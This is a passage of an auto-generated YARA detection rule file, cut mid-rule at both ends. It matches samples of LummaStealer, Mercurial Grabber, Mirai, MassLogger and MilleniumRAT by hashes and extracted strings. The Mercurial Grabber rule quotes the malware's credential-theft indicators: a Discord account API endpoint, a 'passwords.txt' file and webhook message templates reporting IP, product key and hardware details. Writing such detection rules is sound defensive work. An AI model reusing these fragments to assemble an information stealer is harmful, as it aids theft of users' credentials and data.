      $s3 = "target object/alias may not appear in FROM clause: %s" fullword ascii /* score: '14.00'*/
      $s4 = "UPDATE %Q.sqlite_master SET type='%s', name=%Q, tbl_name=%Q, rootpage=#%d, sql=%Q WHERE rowid=#%d" fullword ascii /* score: '12.50'*/
      $s5 = "error in %s %s after %s: %s" fullword ascii /* score: '12.50'*/
      $s6 = "SQL logic error" fullword ascii /* score: '12.00'*/
      $s7 = "sqlite_temp_schema" fullword ascii /* score: '11.00'*/
      $s8 = "error in generated column \"%s\"" fullword ascii /* score: '10.00'*/
      $s9 = "%s clause should come after %s not before" fullword ascii /* score: '10.00'*/
      $s10 = "UPDATE %Q.sqlite_master SET rootpage=%d WHERE #%d AND rootpage=#%d" fullword ascii /* score: '10.00'*/
      $s11 = "INSERT INTO %Q.sqlite_master VALUES('index',%Q,%Q,#%d,%Q);" fullword ascii /* score: '9.50'*/
      $s12 = "UPDATE \"%w\".sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, %d) WHERE name NOT LIKE 'sqliteX" ascii /* score: '9.50'*/
      $s13 = "incomplete input" fullword ascii /* score: '9.00'*/
      $s14 = "output file already exists" fullword ascii /* score: '9.00'*/
      $s15 = "drop column from" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__91802a615b3a5c4bcc05bc5f66a5b219_imphash__LummaStealer_signature__91802a615b3a5c4bcc05bc5f66a5b219__20 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash)_1d9bd7df.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bde9b8b30e8700d3c2759ef0792a3d556063e78670ee31ef19676e5a1a1861cf"
      hash2 = "1d9bd7dfac193a4dfab75e59091f93b2a46232a7a461a6af02b0dddb0b509346"
   strings:
      $x1 = ".lib section in a.out corruptedbad write barrier buffer boundscall from within the Go runtimecannot assign requested addresscasg" ascii /* score: '53.50'*/
      $x2 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x3 = "heapBitsSetTypeGCProg: small allocationmismatched count during itab table copymspan.sweep: bad span state after sweepout of memo" ascii /* score: '49.00'*/
      $x4 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWSetEndOfFileTransmitFileabi mismatchadvapi32" ascii /* score: '44.00'*/
      $x5 = "file descriptor in bad statefindrunnable: netpoll with pgcstopm: negative nmspinninginvalid runtime symbol tablemheap.freeSpanLo" ascii /* score: '43.00'*/
      $x6 = "workbuf is empty initialHeapLive= spinningthreads=, s.searchAddr = : missing method DnsRecordListFreeGC assist markingGetCurrent" ascii /* score: '43.00'*/
      $x7 = "unknown pcws2_32.dll  of size   (targetpc= KiB work,  gcwaiting= heap_live= idleprocs= in status  m->mcache= mallocing= ms clock" ascii /* score: '43.00'*/
      $x8 = "address already in useadvapi32.dll not foundargument list too longassembly checks failedbad g->status in readybad sweepgen in re" ascii /* score: '39.00'*/
      $x9 = " to unallocated spanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGetCurrentDirectoryWGetFileA" ascii /* score: '37.00'*/
      $x10 = "bad lfnode addressbad manualFreeListconnection refusedfile name too longforEachP: not donegarbage collectionidentifier removedin" ascii /* score: '37.00'*/
      $x11 = "ProcessGetShortPathNameWLookupAccountSidWWSAEnumProtocolsWbad TinySizeClassentersyscallblockexec format errorg already scannedlo" ascii /* score: '36.00'*/
      $x12 = "entersyscallgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneednetapi32.dllreleasep" ascii /* score: '33.00'*/
      $s13 = ".dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivedumping heapend tracegc" fullword ascii /* score: '29.00'*/
      $s14 = "structure needs cleaning bytes failed with errno= to unused region of span with too many arguments GODEBUG: can not enable \"Get" ascii /* score: '27.00'*/
      $s15 = "mstartdevice not a streamdirectory not emptydisk quota exceededdodeltimer: wrong Pfile already closedfile already existsfile doe" ascii /* score: '27.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "91802a615b3a5c4bcc05bc5f66a5b219" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__91802a615b3a5c4bcc05bc5f66a5b219_imphash__LummaStealer_signature__91802a615b3a5c4bcc05bc5f66a5b219__21 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, LummaStealer(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash)_1d9bd7df.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_30aaf493.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_6931da3b.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_83f4c42f.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_93b67e92.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bde9b8b30e8700d3c2759ef0792a3d556063e78670ee31ef19676e5a1a1861cf"
      hash2 = "1d9bd7dfac193a4dfab75e59091f93b2a46232a7a461a6af02b0dddb0b509346"
      hash3 = "852fd8e572f18ab2f694153a8943c2ef198c2a5bf6179e7bef30c6dc79f84811"
      hash4 = "30aaf493758998d58bd9ec2b9c0e40b19a259963f777da91afe60f859f4327a3"
      hash5 = "6931da3b18f6ec11042ec36f39f00ff9e565e775147e33105655666e473badd5"
      hash6 = "83f4c42f9867e19b087e43e111f39018cc90fa2710a99947cd3f2fec69427641"
      hash7 = "93b67e925e2b9bfe548c1437a40bc558b2b598f5f9c40c34c7c372814e8b89f4"
   strings:
      $s1 = "q*struct { lock runtime.mutex; newm runtime.muintptr; waiting bool; wake runtime.note; haveTemplateThread uint32 }" fullword ascii /* score: '25.00'*/
      $s2 = "2*struct { lock runtime.mutex; lockOwner *runtime.g; enabled bool; shutdown bool; headerWritten bool; footerWritten bool; shutdo" ascii /* score: '23.00'*/
      $s3 = "2*struct { lock runtime.mutex; lockOwner *runtime.g; enabled bool; shutdown bool; headerWritten bool; footerWritten bool; shutdo" ascii /* score: '23.00'*/
      $s4 = "type..eq.struct { runtime.lock runtime.mutex; runtime.newm runtime.muintptr; runtime.waiting bool; runtime.wake runtime.note; ru" ascii /* score: '20.00'*/
      $s5 = "4; bufLock runtime.mutex; buf runtime.traceBufPtr }" fullword ascii /* score: '18.00'*/
      $s6 = ":*struct { lock runtime.mutex; free [35]runtime.mSpanList }" fullword ascii /* score: '18.00'*/
      $s7 = "2*struct { runtime.mutex; runtime.persistentAlloc }" fullword ascii /* score: '18.00'*/
      $s8 = "ckTab runtime.traceStackTable; stringsLock runtime.mutex; strings map[string]uint64; stringSeq uint64; markWorkerLabels [3]uint6" ascii /* score: '18.00'*/
      $s9 = "*struct { lock runtime.mutex; free *runtime.gcBitsArena; next *runtime.gcBitsArena; current *runtime.gcBitsArena; previous *runt" ascii /* score: '18.00'*/
      $s10 = "e*struct { lock runtime.mutex; next int32; m map[int32]unsafe.Pointer; minv map[unsafe.Pointer]int32 }" fullword ascii /* score: '18.00'*/
      $s11 = "*struct { lock runtime.mutex; free *runtime.gcBitsArena; next *runtime.gcBitsArena; current *runtime.gcBitsArena; previous *runt" ascii /* score: '18.00'*/
      $s12 = "N*struct { lock runtime.mutex; free runtime.mSpanList; busy runtime.mSpanList }" fullword ascii /* score: '18.00'*/
      $s13 = "ntime.haveTemplateThread uint32 }" fullword ascii /* score: '17.00'*/
      $s14 = "runtime.(*gcSweepBuf).pop" fullword ascii /* score: '15.00'*/
      $s15 = "haveTemplateThread" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mercurial_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__Mercurial_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphas_22 {
   meta:
      description = "_subset_batch - from files Mercurial(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, Mercurial(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7006b422.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e1bc27cff3f22b603a2a4d4b6cb81c55c72e2a6c42a71045f0b6684f5d3227d0"
      hash2 = "7006b42214c84b68b8628961e63cd8cd948866bcd99b7ba95924f469cf4aa99d"
   strings:
      $s1 = "https://discordapp.com/api/v8/users/@me" fullword wide /* score: '25.00'*/
      $s2 = "{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**OS Info**\",\"value\":\"Operating System Name - " fullword wide /* score: '25.00'*/
      $s3 = "\",\"inline\":true},{\"name\":\"**Processor**\",\"value\":\"CPU - " fullword wide /* score: '23.00'*/
      $s4 = "\",\"inline\":false},{\"name\":\"**GPU**\",\"value\":\"Video Processor - " fullword wide /* score: '23.00'*/
      $s5 = "passwords.txt" fullword wide /* score: '22.00'*/
      $s6 = "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier" fullword wide /* score: '21.00'*/
      $s7 = "\\nOperating System Architecture - " fullword wide /* score: '21.00'*/
      $s8 = "\\passwords.txt" fullword wide /* score: '20.00'*/
      $s9 = "\"},\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"Mercurial Grabber\"" wide /* score: '20.00'*/
      $s10 = "{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**IP Address Info**\",\"value\":\"IP Address - " fullword wide /* score: '20.00'*/
      $s11 = "{\"content\": \"\",  \"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**Windows Product Key**\",\"value\":\"Product Key - " fullword wide /* score: '20.00'*/
      $s12 = "\",\"inline\":true}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"Me" wide /* score: '20.00'*/
      $s13 = "\",\"inline\":false}],\"footer\":{\"text\":\"Mercurial Grabber | github.com/nightfallgt/mercurial-grabber\"}}],\"username\": \"M" wide /* score: '20.00'*/
      $s14 = "\\nDriver Version  - " fullword wide /* score: '19.00'*/
      $s15 = "HARDWARE\\Description\\System\\SystemProductName" fullword wide /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__00f343a5_Mirai_signature__01849351_Mirai_signature__080f8516_Mirai_signature__0f3f0f00_23 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_00f343a5.elf, Mirai(signature)_01849351.elf, Mirai(signature)_080f8516.elf, Mirai(signature)_0f3f0f00.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "00f343a5aaca34f5fc4ea4e75ea67805d998cd590f93b942f0f323da729335d0"
      hash2 = "0184935108765e7a88999d02e9f27071517d4780994ded9f268837c7fdba4b13"
      hash3 = "080f8516fee3ad02b1a7058f5725efcd1adcf1acb906c0124eb6fbcc2f3c6c50"
      hash4 = "0f3f0f00517d4eb473e9e9ec561728d7bb0caf926e5aaed727575bb3cfd5d871"
   strings:
      $s1 = "__pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s2 = "__pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s3 = "nprocessors_onln" fullword ascii /* score: '15.00'*/
      $s4 = "execve.c" fullword ascii /* score: '12.00'*/
      $s5 = "__GI_config_read" fullword ascii /* score: '10.00'*/
      $s6 = "__GI_getrlimit" fullword ascii /* score: '9.00'*/
      $s7 = "__GI_fgetc_unlocked" fullword ascii /* score: '9.00'*/
      $s8 = "__GI_getc_unlocked" fullword ascii /* score: '9.00'*/
      $s9 = "getrlimit.c" fullword ascii /* score: '9.00'*/
      $s10 = "getegid.c" fullword ascii /* score: '9.00'*/
      $s11 = "__GI_getdtablesize" fullword ascii /* score: '9.00'*/
      $s12 = "tcgetattr.c" fullword ascii /* score: '9.00'*/
      $s13 = "getdents64.c" fullword ascii /* score: '9.00'*/
      $s14 = "__GI_geteuid" fullword ascii /* score: '9.00'*/
      $s15 = "geteuid.c" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__00f343a5_Mirai_signature__080f8516_Mirai_signature__0f3f0f00_24 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_00f343a5.elf, Mirai(signature)_080f8516.elf, Mirai(signature)_0f3f0f00.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "00f343a5aaca34f5fc4ea4e75ea67805d998cd590f93b942f0f323da729335d0"
      hash2 = "080f8516fee3ad02b1a7058f5725efcd1adcf1acb906c0124eb6fbcc2f3c6c50"
      hash3 = "0f3f0f00517d4eb473e9e9ec561728d7bb0caf926e5aaed727575bb3cfd5d871"
   strings:
      $s1 = "_Unwind_decode_target2" fullword ascii /* score: '16.00'*/
      $s2 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii /* score: '14.00'*/
      $s3 = "__gnu_unwind_execute" fullword ascii /* score: '14.00'*/
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/pr-support.c" fullword ascii /* score: '14.00'*/
      $s5 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" fullword ascii /* score: '11.00'*/
      $s6 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm" fullword ascii /* score: '11.00'*/
      $s7 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/unwind-arm.c" fullword ascii /* score: '11.00'*/
      $s8 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/build-gcc/gcc" fullword ascii /* score: '11.00'*/
      $s9 = "J//////////" fullword ascii /* reversed goodware string '//////////J' */ /* score: '11.00'*/
      $s10 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/libunwind.S" fullword ascii /* score: '11.00'*/
      $s11 = "lib1funcs.asm" fullword ascii /* score: '10.00'*/
      $s12 = "getsockopt.c" fullword ascii /* score: '9.00'*/
      $s13 = "getsockname.c" fullword ascii /* score: '9.00'*/
      $s14 = "__GI_getsockname" fullword ascii /* score: '9.00'*/
      $s15 = "__getdents" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__30aaf493_LummaStealer_signature__a520fd20530cf0b0db6a6c3c_25 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_30aaf493.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_6931da3b.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_83f4c42f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "30aaf493758998d58bd9ec2b9c0e40b19a259963f777da91afe60f859f4327a3"
      hash2 = "6931da3b18f6ec11042ec36f39f00ff9e565e775147e33105655666e473badd5"
      hash3 = "83f4c42f9867e19b087e43e111f39018cc90fa2710a99947cd3f2fec69427641"
   strings:
      $x1 = "owner diedschedtracesemacquiresetsockoptws2_32.dll  of size  CloseHandleCreateFileWDeleteFileWExitProcessFreeLibraryGOTRACEBACKG" ascii /* score: '71.00'*/
      $x2 = "file descriptor in bad stateprotocol driver not attachedruntime: bad lfnode address executing on Go runtime stackmachine is not " ascii /* score: '42.00'*/
      $x3 = "connection refusedfile name too longgarbage collectionidentifier removedinput/output errormultihop attemptedno child processesno" ascii /* score: '37.00'*/
      $x4 = "CreateDirectoryWDnsNameCompare_WFlushFileBuffersGC worker (idle)GetComputerNameWGetFullPathNameWGetLongPathNameWNetApiBufferFree" ascii /* score: '35.00'*/
      $x5 = "dllfile existsgccheckmarkgetpeernamegetsocknamemswsock.dllnot reachedscheddetailsecur32.dllshell32.dlluserenv.dll gcscandone Get" ascii /* score: '32.00'*/
      $x6 = "ingGetCurrentProcessGetShortPathNameWLookupAccountSidWWSAEnumProtocolsWexec format errorno data availablepermission deniedruntim" ascii /* score: '31.00'*/
      $x7 = "wrong medium type  but memory size  to non-Go memory CommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLoo" ascii /* score: '31.00'*/
      $s8 = "exchange fullgethostbynamegetservbynamekernel32.dll" fullword ascii /* score: '30.00'*/
      $s9 = "lchan receivedumping heapgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dllnetapi32.dll gcscanvalid  is ni" ascii /* score: '29.00'*/
      $s10 = "GOMAXPROCSGetIfEntryGetVersionWSACleanupWSAStartup_MSpanDead_MSpanFreednsapi.dllgetsockoptinvalidptrntdll.dll" fullword ascii /* score: '28.00'*/
      $s11 = "connection refusedfile name too longgarbage collectionidentifier removedinput/output errormultihop attemptedno child processesno" ascii /* score: '28.00'*/
      $s12 = "level 3 resetsrmount errortimer expiredvalue method  out of range  procedure in CertCloseStoreCreateProcessWCryptGenRandomFindFi" ascii /* score: '27.00'*/
      $s13 = "owner diedschedtracesemacquiresetsockoptws2_32.dll  of size  CloseHandleCreateFileWDeleteFileWExitProcessFreeLibraryGOTRACEBACKG" ascii /* score: '27.00'*/
      $s14 = "etCurrentProcessIdGetTokenInformationWaitForSingleObjectbad file descriptordevice not a streamdirectory not emptydisk quota exce" ascii /* score: '26.00'*/
      $s15 = "wrong medium type  but memory size  to non-Go memory CommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLoo" ascii /* score: '25.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__LummaStealer_signature__a520fd20530cf0b0db6a6c3c8b88d11d__26 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_30aaf493.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_6931da3b.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_83f4c42f.exe, LummaStealer(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_93b67e92.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "852fd8e572f18ab2f694153a8943c2ef198c2a5bf6179e7bef30c6dc79f84811"
      hash2 = "30aaf493758998d58bd9ec2b9c0e40b19a259963f777da91afe60f859f4327a3"
      hash3 = "6931da3b18f6ec11042ec36f39f00ff9e565e775147e33105655666e473badd5"
      hash4 = "83f4c42f9867e19b087e43e111f39018cc90fa2710a99947cd3f2fec69427641"
      hash5 = "93b67e925e2b9bfe548c1437a40bc558b2b598f5f9c40c34c7c372814e8b89f4"
   strings:
      $x1 = "me.mutex; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.mut" ascii /* score: '31.00'*/
      $x2 = "time.mutex; runtime.head runtime.guintptr; runtime.tail runtime.guintptr }; runtime.sweepWaiters struct { runtime.lock runtime.m" ascii /* score: '31.00'*/
      $s3 = "; head runtime.guintptr; tail runtime.guintptr }; sweepWaiters struct { lock runtime.mutex; head runtime.guintptr }; cycles uint" ascii /* score: '28.00'*/
      $s4 = "*struct { full runtime.lfstack; empty runtime.lfstack; pad0 [64]uint8; wbufSpans struct { lock runtime.mutex; free runtime.mSpan" ascii /* score: '27.00'*/
      $s5 = "type..hash.struct { runtime.lock runtime.mutex; runtime.newm runtime.muintptr; runtime.waiting bool; runtime.wake runtime.note; " ascii /* score: '23.00'*/
      $s6 = "L*struct { lock runtime.mutex; head runtime.guintptr; tail runtime.guintptr }" fullword ascii /* score: '23.00'*/
      $s7 = "5*struct { lock runtime.mutex; head runtime.guintptr }" fullword ascii /* score: '23.00'*/
      $s8 = "type..eq.struct { runtime.full runtime.lfstack; runtime.empty runtime.lfstack; runtime.pad0 [64]uint8; runtime.wbufSpans struct " ascii /* score: '22.00'*/
      $s9 = "type..hash.struct { runtime.full runtime.lfstack; runtime.empty runtime.lfstack; runtime.pad0 [64]uint8; runtime.wbufSpans struc" ascii /* score: '22.00'*/
      $s10 = "CreateHardLinkWDeviceIoControlDuplicateHandleFailed to find Failed to load FlushViewOfFileGetAdaptersInfoGetCommandLineWGetProce" ascii /* score: '22.00'*/
      $s11 = "e uint32; mode runtime.gcMode; userForced bool; totaltime int64; initialHeapLive uint64; assistQueue struct { lock runtime.mutex" ascii /* score: '21.00'*/
      $s12 = "*struct { full runtime.lfstack; empty runtime.lfstack; pad0 [64]uint8; wbufSpans struct { lock runtime.mutex; free runtime.mSpan" ascii /* score: '18.00'*/
      $s13 = "t { runtime.lock runtime.mutex; runtime.free runtime.mSpanList; runtime.busy runtime.mSpanList }; _ uint32; runtime.bytesMarked " ascii /* score: '18.00'*/
      $s14 = "{ runtime.lock runtime.mutex; runtime.free runtime.mSpanList; runtime.busy runtime.mSpanList }; _ uint32; runtime.bytesMarked ui" ascii /* score: '18.00'*/
      $s15 = "ex; runtime.head runtime.guintptr }; runtime.cycles uint32; runtime.stwprocs int32; runtime.maxprocs int32; runtime.tSweepTerm i" ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _MassLogger_signature__995cce3d6fb20b2d8af502c8788f55d7_imphash__MassLogger_signature__9e1c5e753d9730385056638ab1d72c60_imph_27 {
   meta:
      description = "_subset_batch - from files MassLogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, MassLogger(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6518acc1ac256a5e244adce532e52a42c09f8599fc38229adb55fce4826cae85"
      hash2 = "984277311c91dbc49e63998341931c412a246899679e0797304a4ea7e88f37d6"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s2 = "DSystem.Text.RegularExpressions.dll" fullword ascii /* score: '26.00'*/
      $s3 = "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089$RelativeOrAbsolute" fullword ascii /* score: '24.00'*/
      $s4 = "<EnsureSufficientExecutionStackBTryEnsureSufficientExecutionStack.GetSufficientStackLimit" fullword ascii /* score: '21.00'*/
      $s5 = ".ExecutionAndPublication@" fullword ascii /* score: '19.00'*/
      $s6 = "xSystem.Collections.Generic.IDictionary<TKey,TValue>.get_Keys@" fullword ascii /* score: '18.00'*/
      $s7 = "Decoded string is not a valid IDN name" fullword wide /* score: '18.00'*/
      $s8 = "2GetUriPartsFromUserString<GetLengthWithoutTrailingSpaces" fullword ascii /* score: '17.00'*/
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s10 = "Invalid IDN encoded string" fullword wide /* score: '16.00'*/
      $s11 = "nSystem.Collections.Generic.ICollection<TValue>.ContainsxSystem.Collections.Generic.IEnumerable<TValue>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s12 = "|System.Collections.Generic.IDictionary<TKey,TValue>.get_Values@" fullword ascii /* score: '15.00'*/
      $s13 = ".GetHashCodeOfStringCore\"IcuInitSortHandle2GetIsAsciiEqualityOrdinal IcuCompareString" fullword ascii /* score: '15.00'*/
      $s14 = ",GetHostViaCustomSyntax" fullword ascii /* score: '14.00'*/
      $s15 = "System.Collections.Generic.ICollection<System.Text.RegularExpressions.Group>.Add@" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__026dda6001e8c6dbad9456432b0003ba_imphash__LummaStealer_signature__2cfee53aeb00cd14e32ccbca525e1ea5__28 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_026dda6001e8c6dbad9456432b0003ba(imphash).exe, LummaStealer(signature)_2cfee53aeb00cd14e32ccbca525e1ea5(imphash).dll, LummaStealer(signature)_3c9ed1bacd930c37be812d1f382b945f(imphash).exe, LummaStealer(signature)_a1ff5e4ca616afab58cf57e2fa1763ee(imphash).exe, MilleniumRAT(signature)_bfc94987b9a21a61fae666713d43dafc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5634306e445a5a62c5cb81dba6663a5c1d7eb8e562b8c1430dfa6c8242e75f5d"
      hash2 = "3ecf6bbee75710b183deee7f671826f78da55f9f773c1c46b14b2c53bdfe67ce"
      hash3 = "7a96989dad3e9c90ef7dd009289c8f5f1ba830e42e24f75e6f0c4ea8f813894d"
      hash4 = "e0fad9f7ce6c5c4f2f3e61b11b38b65da4de8174e0ef574848f3d1488fc1a828"
      hash5 = "73607f1799be5facd81d484fa6b1f6518378037ef16c32eaa0c562ff49c1e0b5"
   strings:
      $s1 = "error in %s %s%s%s: %s" fullword ascii /* score: '16.50'*/
      $s2 = "SqlExec" fullword ascii /* score: '16.00'*/
      $s3 = "REINDEXEDESCAPEACHECKEYBEFOREIGNOREGEXPLAINSTEADDATABASELECTABLEFTHENDEFERRABLELSEXCLUDELETEMPORARYISNULLSAVEPOINTERSECTIESNOTNU" ascii /* score: '15.00'*/
      $s4 = "REINDEXEDESCAPEACHECKEYBEFOREIGNOREGEXPLAINSTEADDATABASELECTABLEFTHENDEFERRABLELSEXCLUDELETEMPORARYISNULLSAVEPOINTERSECTIESNOTNU" ascii /* score: '12.50'*/
      $s5 = "USING ROWID SEARCH ON TABLE %s FOR IN-OPERATOR" fullword ascii /* score: '12.00'*/
      $s6 = "%s USING TEMP B-TREE" fullword ascii /* score: '11.00'*/
      $s7 = "RECEDINGFAILASTFILTEREPLACEFIRSTFOLLOWINGFROMFULLIMITIFORDERESTRICTOTHERSOVERETURNINGRIGHTROLLBACKROWSUNBOUNDEDUNIONUSINGVACUUMV" ascii /* score: '9.50'*/
      $s8 = ",%s%s%s" fullword ascii /* score: '8.00'*/
      $s9 = "cannot override %s of window: %s" fullword ascii /* score: '8.00'*/
      $s10 = "SCAN %d CONSTANT ROW%s" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( all of them )
      ) or ( all of them )
}

rule _LummaStealer_signature__2cfee53aeb00cd14e32ccbca525e1ea5_imphash__MilleniumRAT_signature__bfc94987b9a21a61fae666713d43dafc__29 {
   meta:
      description = "_subset_batch - from files LummaStealer(signature)_2cfee53aeb00cd14e32ccbca525e1ea5(imphash).dll, MilleniumRAT(signature)_bfc94987b9a21a61fae666713d43dafc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3ecf6bbee75710b183deee7f671826f78da55f9f773c1c46b14b2c53bdfe67ce"
      hash2 = "73607f1799be5facd81d484fa6b1f6518378037ef16c32eaa0c562ff49c1e0b5"
   strings:
      $s1 = "MUTEX_W32" fullword ascii /* score: '15.00'*/
      $s2 = "USE TEMP B-TREE FOR LAST %d TERMS OF ORDER BY" fullword ascii /* score: '14.00'*/
      $s3 = "USE TEMP B-TREE FOR %s(ORDER BY)" fullword ascii /* score: '14.00'*/
      $s4 = "USE TEMP B-TREE FOR %s(DISTINCT)" fullword ascii /* score: '14.00'*/
      $s5 = "SCAN %s%s%s" fullword ascii /* score: '12.00'*/
      $s6 = "USE TEMP B-TREE FOR %sORDER BY" fullword ascii /* score: '11.00'*/
      $s7 = "<<<<<<<<<<<<<<<<<" fullword wide /* reversed goodware string '<<<<<<<<<<<<<<<<<' */ /* score: '11.00'*/
      $s8 = "CREATE TABLE x(key,value,type,atom,id,parent,fullkey,path,json HIDDEN,root HIDDEN)" fullword ascii /* score: '10.00'*/
      $s9 = "INSERT INTO %s.sqlite_schema SELECT*FROM \"%w\".sqlite_schema WHERE type IN('view','trigger') OR(type='table'AND rootpage=0)" fullword ascii /* score: '10.00'*/
      $s10 = "SELECT'INSERT INTO %s.'||quote(name)||' SELECT*FROM\"%w\".'||quote(name)FROM %s.sqlite_schema WHERE type='table'AND coalesce(roo" ascii /* score: '10.00'*/
